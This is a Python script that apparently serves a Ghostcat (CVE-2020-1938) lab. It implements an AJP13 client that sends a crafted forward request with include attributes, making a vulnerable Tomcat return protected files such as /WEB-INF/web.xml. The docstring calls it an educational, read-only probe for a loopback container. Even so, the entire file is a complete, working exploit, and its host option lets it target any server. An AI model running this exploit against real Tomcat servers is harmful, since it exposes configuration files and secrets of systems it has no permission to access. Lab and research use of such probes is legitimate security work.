#!/usr/bin/env python3
"""Minimal AJP13 client for the Ghostcat (CVE-2020-1938) lab.

The client sends one AJP13 forward request with the
``javax.servlet.include.request_uri`` and
``javax.servlet.include.servlet_path`` attributes.  A vulnerable Tomcat
uses those attributes to return a file below the web application, for
example ``/WEB-INF/web.xml``.

This is an educational, read-only probe for a loopback lab container.
The AJP13 packet format is documented in the Apache Tomcat AJP
protocol description and in the Ghostcat advisory.
"""
import argparse
import socket
import struct
import sys

CLIENT_MAGIC = b"\x12\x34"
SERVER_MAGIC = b"\x41\x42"


def ajp_string(value: bytes) -> bytes:
    return struct.pack(">H", len(value)) + value + b"\x00"


def build_forward_request(filename: str, server_port: int) -> bytes:
    host = b"127.0.0.1"
    attributes = [
        (b"javax.servlet.include.request_uri", b"index"),
        (b"javax.servlet.include.servlet_path", filename.encode()),
    ]

    payload = b"".join([
        b"\x02",                    # forward request
        b"\x02",                    # GET
        ajp_string(b"HTTP/1.1"),
        ajp_string(b"/index.txt"),
        ajp_string(b"127.0.0.1"),
        ajp_string(b"localhost"),
        ajp_string(host),
        struct.pack(">H", server_port),
        b"\x00",                    # is_ssl
        struct.pack(">H", 1),       # one header
        b"\xa0\x0b",                # host header code
        ajp_string(host + b":" + str(server_port).encode()),
    ])
    for name, value in attributes:
        payload += b"\x0a" + ajp_string(name) + ajp_string(value)
    payload += b"\xff\x00"
    return CLIENT_MAGIC + struct.pack(">H", len(payload)) + payload


def recv_exact(sock: socket.socket, count: int) -> bytes:
    data = b""
    while len(data) < count:
        chunk = sock.recv(count - len(data))
        if not chunk:
            raise ConnectionError("connection closed")
        data += chunk
    return data


def read_response(sock: socket.socket) -> bytes:
    body = b""
    while True:
        if recv_exact(sock, 2) != SERVER_MAGIC:
            break
        length = struct.unpack(">H", recv_exact(sock, 2))[0]
        packet = recv_exact(sock, length)
        code = packet[0]
        if code == 3:  # SEND_BODY_CHUNK
            chunk_len = struct.unpack(">H", packet[1:3])[0]
            body += packet[3:3 + chunk_len]
        elif code == 5:  # END_RESPONSE
            break
    return body


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=18009)
    parser.add_argument("--file", default="/WEB-INF/web.xml")
    parser.add_argument("--server-port", type=int, default=18080)
    parser.add_argument("--timeout", type=float, default=5.0)
    args = parser.parse_args()

    request = build_forward_request(args.file, args.server_port)
    try:
        with socket.create_connection((args.host, args.port), timeout=args.timeout) as sock:
            sock.settimeout(args.timeout)
            sock.sendall(request)
            body = read_response(sock)
    except (OSError, ConnectionError) as error:
        print(f"AJP request failed: {error}", file=sys.stderr)
        return 2

    sys.stdout.write(body.decode("utf-8", "replace"))
    return 0 if body else 1


if __name__ == "__main__":
    sys.exit(main())
